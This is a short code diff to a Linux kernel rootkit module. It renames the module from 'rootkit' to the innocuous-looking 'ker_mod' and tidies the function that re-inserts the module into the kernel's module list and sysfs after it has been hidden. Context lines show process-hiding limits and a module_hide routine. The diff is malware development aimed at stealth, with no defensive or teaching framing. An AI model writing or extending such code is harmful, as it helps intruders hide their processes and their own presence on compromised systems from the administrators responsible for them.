@@ -14,7 +14,7 @@
 
 MODULE_LICENSE("GPL");
 
-#define MODULE_NAME "rootkit"
+#define MODULE_NAME "ker_mod"
 #define MAX_HIDDEN_PIDS 5
 #define MAX_PID_LENGTH 6
 
@@ -70,12 +70,11 @@ void module_hide(void) {
 }
 
 void module_show(void) {
-		int result;
 		/* The module is not hidden yet, nothing more to show. */
 		if(!module_hidden) return;
 
 		list_add(&THIS_MODULE->list, module_previous);
-		result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "ker_mod");
+		kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
 		module_hidden = !module_hidden;
 		printk(KERN_INFO "Rootkit no longer hidden\n");
 }
